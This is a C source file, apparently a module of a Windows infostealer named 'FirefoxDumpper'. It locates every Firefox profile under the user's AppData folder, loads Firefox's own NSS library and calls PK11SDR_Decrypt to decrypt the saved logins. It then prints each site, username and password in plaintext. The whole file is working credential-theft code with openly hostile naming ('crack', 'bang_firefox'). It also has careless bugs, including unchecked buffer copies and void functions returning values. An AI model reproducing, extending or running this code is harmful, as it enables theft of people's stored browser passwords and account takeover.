
#include<Windows.h>
#include "cJSON.h"
#include <stdint.h>
#include <io.h>
#include <stdlib.h>

#define F_OK 0
#define access _access
#include "dirent.h"
#include "cJSON.h"
#include "base64.h"
#include "FirefoxDumpper.h"

#pragma comment (lib, "crypt32.lib")
#pragma warning(disable : 4996)

#define MAX_LEN 1024




static long get_file_size(FILE* fp);

static FILE* file_exists(const char* filename);

long get_file_size(FILE* fp) {
    if (fseek(fp, 0, SEEK_END) < 0) {
        return -1;
    }

    long size = ftell(fp);
    // release the resources when not required
    fseek(fp, 0, SEEK_SET);
    return size;
}

FILE* file_exists(const char* filename)
{
    if (access(filename, F_OK) == 0) {
        FILE* fp = fopen(filename, "r");
        if (fp != NULL)
        {
            return fp;

        }
    }
    return NULL;
}

void load_nss() {
    HMODULE mozglue_dll = LoadLibraryA("C:\\Program Files\\Mozilla Firefox\\mozglue.dll");
    HMODULE nss_dll = LoadLibraryA("C:\\Program Files\\Mozilla Firefox\\nss3.dll");
    printf("%d\n", GetLastError());
    nss_init = GetProcAddress(nss_dll, "NSS_Init");
    PK11SDR_decrypt = GetProcAddress(nss_dll, "PK11SDR_Decrypt");
    nss_shutdown = GetProcAddress(nss_dll, "NSS_Shutdown");

}
char* crack(char* s) {

    SECStatus status;
    SECItem in, out;
    char* result = malloc(MAX_LEN);
    int* ret = malloc(sizeof(int));
    char* data = base64_decode(s, strlen(s), ret);

    in.type = siBuffer;
    in.data = data;
    in.len = *ret;
    out.type = 0;
    out.data = malloc(MAX_LEN);
    out.len = 0;
    status = (*PK11SDR_decrypt) (&in, &out, NULL);
    if (status == SECSuccess) {
        memcpy(result, out.data, out.len);
        result[out.len] = 0;
    }
    else
        result = "Error on decryption!";

    return result;
}


void bang_firefox(char* profile_path, char* logins_path, FILE* logins_file, char* key_path, FILE* key_file) {
    // read logins file
    long int fsize = get_file_size(logins_file);
    char* json = (char*)malloc(fsize + 1);

    int loginsf_len = fread(json, 1, fsize, logins_file);
    json[fsize] = '\0';

    // parse json string to get field
    cJSON* cjson = cJSON_Parse(json);
    if (cjson == NULL) {
        const char* error_ptr = cJSON_GetErrorPtr();
        if (error_ptr != NULL) {
            printf("Error: %s\n", error_ptr);
        }
        cJSON_Delete(cjson);
        return 1;
    }

    // access the JSON data and extract key
    cJSON* logins_obj = cJSON_GetObjectItem(cjson, "logins");
    if (logins_obj) {

        cJSON* item;
        cJSON_ArrayForEach(item, logins_obj)
        {
            cJSON* hostname = cJSON_GetObjectItem(item, "hostname");
            cJSON* encUsername = cJSON_GetObjectItem(item, "encryptedUsername");
            cJSON* encPassword = cJSON_GetObjectItem(item, "encryptedPassword");
            

            // to decrypt passwords
            load_nss();
            nss_init(profile_path);
            printf("url:%s\n", hostname->valuestring);
            printf("username: %s\n", crack(encUsername->valuestring));
            printf("password: %s\n", crack(encPassword->valuestring));

        }

    }
    else {
        return 1;
    }

    // free json related pointers
    cJSON_Delete(cjson);
    free(json);
}



int firefox()
{
    // constant path vars
    char firefox_path_end[100] = "\\appdata\\roaming\\mozilla\\firefox\\profiles\\";
    char* login_filename = "logins.json";
    char* key_filename = "key4.db";


    char* userprofile = getenv("USERPROFILE");
    char default_path[MAX_LEN];
    strcpy(default_path, userprofile);
    strcat(default_path, firefox_path_end);


    DIR* dp;
    struct dirent* ep;
    dp = opendir(default_path);
    if (dp != NULL)
    {
        while ((ep = readdir(dp)) != NULL)
        {
            if (!strcmp(ep->d_name, ".") || !strcmp(ep->d_name, ".."))
                continue;

            // open directories and check if logins.js + key.db exist
            char prof_path[MAX_LEN];
            char logins_path[MAX_LEN];
            strcpy(logins_path, default_path);
            strcat(logins_path, ep->d_name);
            strcat(logins_path, "\\");
            strcpy(prof_path, logins_path);
            strcat(logins_path, login_filename);

            FILE* logins_f = file_exists(logins_path);

            if (!logins_f)
                continue;

            char key_path[MAX_LEN];
            strcpy(key_path, default_path);
            strcat(key_path, ep->d_name);
            strcat(key_path, "\\");
            strcat(key_path, key_filename);

            FILE* key_f = file_exists(key_path);

            if (!key_f)
                continue;


            // if both key file and logins exist, go for decryption
            bang_firefox(prof_path, logins_path, logins_f, key_path, key_f);
            fclose(logins_f);
            fclose(key_f);


        }

        (void)closedir(dp);
        return 0;
    }
    else
    {
        perror("Couldn't open the directory");
        return -1;
    }



}
